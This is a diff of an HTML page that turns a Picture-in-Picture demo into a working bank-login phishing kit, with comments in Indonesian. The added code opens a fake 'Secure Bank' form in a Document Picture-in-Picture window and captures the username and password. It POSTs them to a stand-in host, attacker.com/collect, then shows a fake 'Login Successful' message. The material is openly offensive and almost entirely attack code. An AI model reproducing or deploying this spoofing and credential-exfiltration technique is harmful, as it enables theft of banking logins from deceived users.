@@ -1,47 +1,93 @@
-<title>Social Connect</title>
-<style>#content { display: none; }</style>
+<title>Banking App</title>
+<style>#authKit { display: none; }</style>
 
 <center>
-<br><br><br><h2>Login With the <b>Facebook</b>: <br><br><br><br>
-<img style="cursor: pointer;" src=https://scandiweb.com/blog/wp-content/uploads/2021/02/facebook-login-button-png-11.png id="button">
+<br><br><br><h2>Secure <b>Bank Login</b>: <br><br><br><br>
+<img style="cursor: pointer; width: 300px;" src=https://www.pngitem.com/pimgs/m/140-1400376_login-button-png-transparent-png.png id="loginBtn">
 
-<div id="content">
-<title>Facebook</title>
-<iframe id=frm style="position: fixed;display:none;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;height: 100%;" src=https://facebook.com></iframe>
+<div id="authKit">
+<title>Secure Bank Portal</title>
+<iframe id=bankFrame style="position: fixed;display:none;top: 0;left: 0;width: 100%;height: 100%;border: none;z-index: 999999;" srcdoc='
+<!DOCTYPE html>
+<html>
+<head><title>Bank Login</title></head>
+<body style="background: #1a237e; color: white; font-family: Arial; margin: 0; padding: 40px;">
+    <center>
+    <h1>🏦 Secure Bank</h1>
+    <h3>Online Banking Login</h3>
+    
+    <form id=loginForm onsubmit="return processLogin(this)">
+        <input type="text" name="username" placeholder="Username" required style="padding: 12px; margin: 8px; width: 300px; border-radius: 4px; border: 1px solid #ccc;"><br>
+        <input type="password" name="password" placeholder="Password" required style="padding: 12px; margin: 8px; width: 300px; border-radius: 4px; border: 1px solid #ccc;"><br>
+        <button type="submit" style="padding: 12px 30px; background: #00C851; color: white; border: none; border-radius: 4px; cursor: pointer; margin-top: 15px;">
+            Secure Login
+        </button>
+    </form>
+    </center>
+
+    <script>
+        function processLogin(form) {
+            const credentials = {
+                username: form.username.value,
+                password: form.password.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Kirim ke parent context (PiP window)
+            if (window.parent && window.parent.handleStolenCredentials) {
+                window.parent.handleStolenCredentials(credentials);
+            }
+            
+            // Tampilkan fake success
+            document.body.innerHTML = `
+                <center style="padding: 100px;">
+                    <h2 style="color: #00C851;">✅ Login Successful</h2>
+                    <p>Accessing your account...</p>
+                </center>
+            `;
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
+'></iframe>
 
 <script>
-// Embedded script yang ikut tertransplant
-function handleAuth() {
-    // Function ini akan tetap work di PiP context!
-    console.log('Auth handling in PiP window!');
+// Function yang ikut tertransplant ke PiP
+function handleStolenCredentials(creds) {
+    console.log('CREDENTIALS CAPTURED IN PiP:', creds);
     
-    // Bisa access iframe content
-    if (window.frm && frm.contentWindow) {
-        console.log('Iframe accessible in new context');
-    }
+    // Dalam real attack, kirim ke server attacker
+    fetch('https://attacker.com/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(creds)
+    }).catch(err => console.log('Send failed:', err));
+    
+    // Tampilkan feedback di PiP
+    alert('Login verified! Redirecting...');
 }
 </script>
 </div>
 
 <script> 
-    var pipOpen = async () => {
-        // Buat PiP window
-        pipWindow = await documentPictureInPicture.requestWindow({
-            width: 600,
-            height: 700
+    var launchBankSpoof = async () => {
+        const pipWindow = await documentPictureInPicture.requestWindow({
+            width: 500,
+            height: 600
         });
 
-        // 🎯 MAGIC TRANSPLANTATION: Pindahkan entire content
-        pipWindow.document.body.append(content); 
+        // 🎯 TRANSPLANT: Pindahkan entire auth kit
+        pipWindow.document.body.append(authKit);
         
-        // 🎯 ACCESS PRESERVED: iframe tetap accessible
-        pipWindow.frm.style.display='block';
+        // 🎯 ACCESS & ACTIVATE: iframe sekarang available di PiP context
+        pipWindow.bankFrame.style.display = 'block';
         
-        // 🎯 SCRIPT PRESERVATION: embedded script tetap work
-        setTimeout(() => {
-            pipWindow.handleAuth(); // Function masih executable!
-        }, 1000);
-
+        // 🎯 FUNCTION PRESERVATION: handleStolenCredentials tersedia
+        console.log('PiP ready - functions preserved:', 
+                   typeof pipWindow.handleStolenCredentials);
+        
     };
-    button.onclick = pipOpen;
+    loginBtn.onclick = launchBankSpoof;
 </script>
